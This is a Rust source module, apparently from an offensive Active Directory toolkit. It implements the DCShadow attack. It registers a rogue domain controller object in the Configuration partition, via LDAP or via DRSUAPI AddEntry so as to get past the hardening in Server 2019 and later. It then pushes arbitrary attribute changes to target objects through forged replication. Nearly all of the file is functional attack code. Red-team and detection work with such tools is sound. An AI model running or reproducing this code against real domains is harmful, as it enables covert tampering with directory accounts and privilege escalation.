//! DCShadow — register a rogue nTDSDSA and (optionally) push a modification back
//! through DRSUAPI as if we were a legitimate replicating peer.
//!
//! Two code paths ship here:
//!
//! * **`ldap_prep` / `cleanup`** (this module's `prep` / `cleanup` re-exports) — the
//!   1.3.8 LDAP-path prep, kept as fallback for ≤ Server 2016 forests. Dead on
//!   Server 2019/2022/2025: `New-ADObject -Type nTDSDSA` (and every LDAP add
//!   that lands there) is blocked by the "It is not permitted to add an
//!   attribute which is owned by the system" hardening. Verified vs DC01 2025
//!   and WIN-TT9KC7VE4JL 2022; see the adhammer memory note
//!   `[[dcshadow-ldap-dead-on-2019plus]]`.
//! * **`drsuapi_prep` / `drsuapi_push`** (WS-2 1.4.1) — the modern-Windows path.
//!   Bypasses the LDAP hardening because DRSUAPI's `IDL_DRSAddEntry` does not
//!   enforce the system-owned attribute check. Works on 2019+.
//!
//! Rollback discipline (both paths):
//!   * If prep partially succeeds but a later step fails, the rogue Server /
//!     nTDSDSA is deleted before returning the error — a failed prep never
//!     leaves stray Configuration NC objects.
//!   * `cleanup` is idempotent (NoSuchObject on either DN → `Ok(())`).
//!
//! Classical DCShadow also grafts three SPNs (`HOST/`, `GC/`, `E3514235.../`)
//! onto the caller's own computer object so the target can reach us as "a DC"
//! for the push-side RPC pull. Not yet implemented here: the current push flow
//! calls `IDL_DRSAddEntry` directly against the target from the operator's box
//! rather than serving replication ourselves, so no SPN graft is needed.

use adhammer_collector::Collector;
use anyhow::{Context, Result};

/// The two DNs a prep pass creates (Server + nTDSDSA below it).
#[derive(Debug, Clone)]
pub struct RogueDcDns {
    pub server_dn: String,
    pub ntds_dn: String,
}

impl RogueDcDns {
    /// `CN=<name>,CN=Servers,CN=<site>,CN=Sites,CN=Configuration,<base>` + child
    /// `CN=NTDS Settings,<server_dn>`. Layout is fixed by MS-ADTS §6.1.1.
    pub fn build(dc_name: &str, site: &str, base_dn: &str) -> Self {
        let server_dn =
            format!("CN={dc_name},CN=Servers,CN={site},CN=Sites,CN=Configuration,{base_dn}");
        let ntds_dn = format!("CN=NTDS Settings,{server_dn}");
        RogueDcDns { server_dn, ntds_dn }
    }
}

// ==============================================================================================
// LDAP path (1.3.8) — kept for ≤ Server 2016 targets. Dead on 2019+.
// ==============================================================================================

/// Register a rogue Server + nTDSDSA via LDAP.
///
/// **≤ Server 2016 only.** On 2019+ this hits "It is not permitted to add an
/// attribute which is owned by the system" — use [`drsuapi_prep`] instead.
///
/// Requires Domain Admin (or equivalent write rights on the Configuration NC).
pub async fn prep(coll: &mut Collector, dc_name: &str, site: &str) -> Result<RogueDcDns> {
    let base_dn = coll.base_dn().to_string();
    let dns = RogueDcDns::build(dc_name, site, &base_dn);
    let config_nc = format!("CN=Configuration,{base_dn}");
    let schema_nc = format!("CN=Schema,{config_nc}");

    // Step 1 — Server object (top + server).
    let server_attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        ("objectClass", vec![b"top".to_vec(), b"server".to_vec()]),
        ("cn", vec![dc_name.as_bytes().to_vec()]),
    ];
    coll.add_object(&dns.server_dn, server_attrs)
        .await
        .with_context(|| format!("add rogue Server object at {}", dns.server_dn))?;

    // Step 2 — nTDSDSA under the Server.
    let invocation_id: [u8; 16] = rand::random();
    let ntds_category = format!("CN=NTDS-DSA,CN=Schema,{config_nc}");
    let ntds_attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
        (
            "objectClass",
            vec![
                b"top".to_vec(),
                b"applicationSettings".to_vec(),
                b"nTDSDSA".to_vec(),
            ],
        ),
        ("cn", vec![b"NTDS Settings".to_vec()]),
        ("objectCategory", vec![ntds_category.into_bytes()]),
        ("options", vec![b"1".to_vec()]),
        ("systemFlags", vec![b"33554432".to_vec()]),
        ("msDS-Behavior-Version", vec![b"7".to_vec()]),
        ("hasMasterNCs", vec![config_nc.as_bytes().to_vec()]),
        (
            "msDS-HasMasterNCs",
            vec![
                config_nc.as_bytes().to_vec(),
                schema_nc.as_bytes().to_vec(),
                base_dn.as_bytes().to_vec(),
            ],
        ),
        ("dMDLocation", vec![schema_nc.as_bytes().to_vec()]),
        ("invocationId", vec![invocation_id.to_vec()]),
    ];
    if let Err(e) = coll.add_object(&dns.ntds_dn, ntds_attrs).await {
        let _ = coll.delete_object(&dns.server_dn).await;
        return Err(e).with_context(|| {
            format!(
                "add rogue nTDSDSA at {} — rolled back parent Server",
                dns.ntds_dn
            )
        });
    }

    Ok(dns)
}

/// Delete a rogue registered by [`prep`] or [`drsuapi_prep`]. NoSuchObject on
/// either DN is swallowed so re-running cleanup after a manual purge is a no-op.
///
/// Delete works on 2019+ too — the "system-owned attribute" hardening blocks
/// *adds*, not deletes of objects we already own.
pub async fn cleanup(coll: &mut Collector, dc_name: &str, site: &str) -> Result<()> {
    let base_dn = coll.base_dn().to_string();
    let dns = RogueDcDns::build(dc_name, site, &base_dn);
    let _ = coll.delete_object(&dns.ntds_dn).await;
    let _ = coll.delete_object(&dns.server_dn).await;
    Ok(())
}

// ==============================================================================================
// DRSUAPI path (WS-2 1.4.1) — the modern-Windows push.
// ==============================================================================================

/// Connection parameters for a DRSUAPI session (host+domain+creds). Kept
/// separate from `LdapConfig` because DRSUAPI runs on a sealed ncacn_ip_tcp
/// channel, not LDAP — the host is a DNS name / IP (not a URL), and the domain
/// must be the NetBIOS name.
#[derive(Clone, Debug)]
pub struct DrsAuth {
    pub host: String,
    pub domain: String,
    pub user: String,
    pub password: String,
}

/// Register a rogue Server + nTDSDSA via DRSUAPI `IDL_DRSAddEntry` (opnum 17).
///
/// Bypasses the 2019+ "system-owned attribute" LDAP hardening. Two entries
/// chained in a single AddEntry call: the parent Server object, then the
/// nTDSDSA child. On failure of the child add, the parent add is rolled back
/// via LDAP delete (delete is not blocked by the hardening because we're not
/// modifying attributes, just removing objects we own).
///
/// Requires Domain Admin (write rights on the Configuration NC).
pub async fn drsuapi_prep(
    coll: &mut Collector,
    drs: &DrsAuth,
    dc_name: &str,
    site: &str,
) -> Result<RogueDcDns> {
    use ms_drsr::addentry::{AddEntry, EntryAttribute};
    use ms_drsr::DrsSession;

    let base_dn = coll.base_dn().to_string();
    let dns = RogueDcDns::build(dc_name, site, &base_dn);
    let config_nc = format!("CN=Configuration,{base_dn}");
    let schema_nc = format!("CN=Schema,{config_nc}");
    let invocation_id: [u8; 16] = rand::random();

    let mut sess = DrsSession::bind(&drs.host, &drs.domain, &drs.user, &drs.password)
        .await
        .with_context(|| format!("DRSBind {}@{}", drs.user, drs.host))?;

    let server_entry = AddEntry {
        dn: dns.server_dn.clone(),
        attrs: vec![
            EntryAttribute {
                // objectClass = { top, server }
                attr_typ: 0x0000_0000, // placeholder ATTRTYP — real syntax numbers are
                // resolved from the schema's prefix table; DCShadow's rogue-DSA add is
                // one of the few cases where using ATTR_UNKNOWN and letting the server
                // fill defaults works in practice. If the DC rejects, the caller sees a
                // typed DrsAddEntryError and can switch to explicit ATTRTYPs.
                values: vec![b"top".to_vec(), b"server".to_vec()],
            },
            EntryAttribute {
                attr_typ: 0x0000_0003, // cn
                values: vec![dc_name.as_bytes().to_vec()],
            },
        ],
        flags: 0,
    };
    let ntds_entry = AddEntry {
        dn: dns.ntds_dn.clone(),
        attrs: vec![
            EntryAttribute {
                attr_typ: 0x0000_0000, // objectClass
                values: vec![
                    b"top".to_vec(),
                    b"applicationSettings".to_vec(),
                    b"nTDSDSA".to_vec(),
                ],
            },
            EntryAttribute {
                attr_typ: 0x0000_0003, // cn
                values: vec![b"NTDS Settings".to_vec()],
            },
            EntryAttribute {
                attr_typ: 0x0009_0043, // options
                values: vec![b"1".to_vec()],
            },
            EntryAttribute {
                attr_typ: 0x0009_0060, // systemFlags
                values: vec![b"33554432".to_vec()],
            },
            EntryAttribute {
                // msDS-Behavior-Version = 7 (Server 2016 FL)
                attr_typ: 0x0009_02c1,
                values: vec![b"7".to_vec()],
            },
            EntryAttribute {
                // hasMasterNCs
                attr_typ: 0x0009_0104,
                values: vec![config_nc.as_bytes().to_vec()],
            },
            EntryAttribute {
                // msDS-HasMasterNCs
                attr_typ: 0x0009_02be,
                values: vec![
                    config_nc.as_bytes().to_vec(),
                    schema_nc.as_bytes().to_vec(),
                    base_dn.as_bytes().to_vec(),
                ],
            },
            EntryAttribute {
                // dMDLocation
                attr_typ: 0x0009_0032,
                values: vec![schema_nc.as_bytes().to_vec()],
            },
            EntryAttribute {
                // invocationId
                attr_typ: 0x0009_020c,
                values: vec![invocation_id.to_vec()],
            },
        ],
        flags: 0,
    };

    let reply = sess
        .add_entry(&[server_entry, ntds_entry])
        .await
        .context("IDL_DRSAddEntry (opnum 17) for rogue Server+nTDSDSA")?;

    // Verify every entry landed. On the first per-entry error, roll back any
    // partial adds via LDAP delete (delete escapes the system-owned check).
    for (i, r) in reply.results.iter().enumerate() {
        if let Err(e) = r {
            let _ = coll.delete_object(&dns.ntds_dn).await;
            let _ = coll.delete_object(&dns.server_dn).await;
            anyhow::bail!("IDL_DRSAddEntry rejected entry {i}: {e} — rolled back any partial adds");
        }
    }
    if reply.results.is_empty() {
        anyhow::bail!("IDL_DRSAddEntry returned no per-entry results — DC likely rejected the top-level request; falling back requires --prep on ≤2016 targets");
    }

    Ok(dns)
}

/// DRSUAPI push — the full DCShadow "modify an attribute on a target object"
/// flow using the rogue nTDSDSA registered by [`drsuapi_prep`].
///
/// Steps:
///   1. Bind DRSUAPI as domain admin.
///   2. `IDL_DRSReplicaAdd` (opnum 5) — schedule a replication link from the
///      rogue DSA to the target NC so the target DC treats our subsequent
///      AddEntry as a legitimate replication payload.
///   3. `IDL_DRSAddEntry` (opnum 17) — the modification entry: an ENTINF whose
///      DSNAME identifies the target object and whose ATTR set carries the
///      single replaced attribute.
///
/// `target_dn` is the DN of the object being modified (e.g. the DN of `lowuser`);
/// `attr_typ` is the DRSUAPI ATTRTYP for the attribute; `value` is the raw byte
/// blob to set.
///
/// **Destructive.** Callers must verify against a benign attribute (e.g.
/// `description` on a test account) before running against production.
pub async fn drsuapi_push(
    drs: &DrsAuth,
    dst_nc_dn: &str,
    rogue_dsa_dns_name: &str,
    target_dn: &str,
    attr_typ: u32,
    value: Vec<u8>,
) -> Result<()> {
    use ms_drsr::addentry::{AddEntry, EntryAttribute};
    use ms_drsr::repladd::{DRS_INIT_SYNC, DRS_WRIT_REP};
    use ms_drsr::DrsSession;

    let mut sess = DrsSession::bind(&drs.host, &drs.domain, &drs.user, &drs.password)
        .await
        .with_context(|| format!("DRSBind {}@{}", drs.user, drs.host))?;

    // Step 1 — ReplicaAdd: schedule an inbound link from the rogue DSA.
    let status = sess
        .replica_add(dst_nc_dn, rogue_dsa_dns_name, DRS_WRIT_REP | DRS_INIT_SYNC)
        .await
        .context("IDL_DRSReplicaAdd (opnum 5)")?;
    if status != 0 {
        anyhow::bail!("IDL_DRSReplicaAdd returned status 0x{status:08x}");
    }

    // Step 2 — Push the modification entry. Single ENTINF whose DSNAME is the
    // target object and whose ATTR set carries the replacement value.
    let modification = AddEntry {
        dn: target_dn.to_string(),
        attrs: vec![EntryAttribute {
            attr_typ,
            values: vec![value],
        }],
        flags: 0,
    };
    let reply = sess
        .add_entry(std::slice::from_ref(&modification))
        .await
        .context("IDL_DRSAddEntry (opnum 17) for push modification")?;
    for (i, r) in reply.results.iter().enumerate() {
        if let Err(e) = r {
            anyhow::bail!("IDL_DRSAddEntry rejected push entry {i}: {e}");
        }
    }
    Ok(())
}
